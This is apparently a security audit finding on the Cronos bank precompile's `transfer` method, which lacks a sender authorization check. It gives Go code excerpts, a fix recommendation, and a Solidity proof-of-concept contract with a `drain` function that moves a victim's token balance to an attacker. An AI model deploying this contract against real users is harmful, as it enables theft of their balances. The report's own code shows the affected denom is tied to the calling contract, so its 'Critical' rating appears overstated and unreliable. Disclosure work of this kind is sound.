### Title
Unauthorized Transfer of Native Bank Tokens via Bank Precompile `transfer` Method — (`x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts an arbitrary `sender` address as a call argument and executes `SendCoins` from that address without verifying that the actual EVM caller authorized the transfer. Any deployed EVM contract can drain native bank tokens (denom `evm/0x{contractAddress}`) from any user's account to any recipient, with no approval or consent mechanism.

### Finding Description
The `transfer` case in `BankContract.Run` reads `sender` directly from ABI-decoded call arguments:

```go
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
...
denom := EVMDenom(contract.Caller())   // evm/0x{callerContract}
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

`contract.Caller()` is used only to derive the denom namespace, not to authorize the transfer. There is no check that `sender == contract.Caller()` or that `sender` has granted an allowance to the calling contract. The `ExecuteNativeAction` callback performs no additional authorization. [2](#0-1) 

The denom is `evm/0x{callerContractAddress}` — tokens of this denom are minted by the calling contract via the same precompile's `mint` method and held in users' native bank balances. [3](#0-2) 

### Impact Explanation
A malicious EVM contract can:
1. Mint `evm/0x{maliciousContract}` tokens to users (or users acquire them through a legitimate-looking interface).
2. At any later time, call `transfer(victimAddress, attackerAddress, victimBalance)` on the bank precompile.
3. The precompile executes `SendCoins(victim, attacker, amount)` unconditionally, draining the victim's native bank balance of that denom.

This is an **unauthorized transfer of precompile-controlled assets** — matching the Critical impact tier: *"Unauthorized mint, burn, transfer, bridge, conversion, escrow release, or balance/accounting change for … precompile-controlled assets."*

### Likelihood Explanation
The entry path is fully unprivileged. Any EOA can deploy an EVM contract on Cronos and call the bank precompile at address `0x0000…0064`. No admin key, governance action, or special permission is required. The only precondition is that victim accounts hold a non-zero balance of the contract's `evm/` denom, which the attacker can engineer by minting tokens to users first.

### Recommendation
Enforce that the `sender` argument in the `transfer` method equals `contract.Caller()`, or implement an ERC20-style allowance mapping so that a contract can only move tokens it has been explicitly approved to spend. The `mint` and `burn` methods correctly tie the denom to `contract.Caller()` — the same constraint must be applied to `transfer`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));

    // Step 1: mint tokens to victim (e.g., as a "reward")
    function mintToVictim(address victim, uint256 amount) external payable {
        BANK.mint(victim, amount);
    }

    // Step 2: drain victim's balance at any time, no consent needed
    function drain(address victim, address attacker, uint256 amount) external {
        BANK.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `MaliciousToken` at address `0xABC`.
2. Attacker calls `mintToVictim(victim, 1000)` — victim now holds 1000 `evm/0xABC` in the native bank.
3. Attacker calls `drain(victim, attacker, 1000)` — the bank precompile executes `SendCoins(victim, attacker, 1000 evm/0xABC)` with no authorization check.
4. Victim's balance is zero; attacker holds 1000 `evm/0xABC`. [1](#0-0)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L130-152)
```go
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
